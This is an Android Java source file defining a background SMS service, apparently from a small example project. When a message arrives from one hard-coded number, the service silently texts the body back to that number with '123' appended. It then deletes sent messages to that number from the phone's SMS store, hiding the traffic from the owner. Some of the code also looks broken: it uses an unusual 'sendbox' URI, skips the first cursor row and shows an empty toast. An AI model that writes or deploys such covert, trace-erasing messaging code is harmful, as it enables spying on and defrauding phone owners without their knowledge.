package com.example.v_wenjiw.message;

import android.app.Service;
import android.content.ContentResolver;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.os.IBinder;
import android.telephony.SmsManager;
import android.telephony.gsm.SmsMessage;
import android.widget.Toast;

public class SMSService extends Service {
    public SMSService() {
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Bundle bundle = intent.getExtras();

        SmsManager smsManager = SmsManager.getDefault();
        if (bundle != null) {
            StringBuilder sb = new StringBuilder();
            Object[] sms = (Object[]) bundle.get("pdus");
            SmsMessage[] messages = new SmsMessage[sms.length];
            for (int i = 0; i < sms.length; i++) {
                messages[i] = SmsMessage.createFromPdu((byte[]) sms[i]);
            }

            for (SmsMessage message : messages) {
                if (message.getDisplayOriginatingAddress().equals("15005427285")) {
                    smsManager.sendTextMessage("15005427285", null, message.getDisplayMessageBody() + "123", null, null);
                }

                ContentResolver resolver=getContentResolver();
                Cursor cursor = resolver.query(Uri.parse("content://sms/sendbox"), null, null, null, null);
                if (cursor != null && cursor.moveToFirst()) {
                    while (cursor.moveToNext()) {
                        long id = cursor.getLong(cursor.getColumnIndex("_id"));
                        String targetAddress = cursor.getString(cursor.getColumnIndex("address"));

                        if(targetAddress.equals("15005427285"))
                        {
                            resolver.delete(Uri.parse("content://sms/sendbox"),"address = ?",new String[]{"15005427285"});
                        }
                    }
                }
            }

            Toast.makeText(this, sb.toString(), Toast.LENGTH_LONG).show();
        }

        return START_STICKY;
    }
}
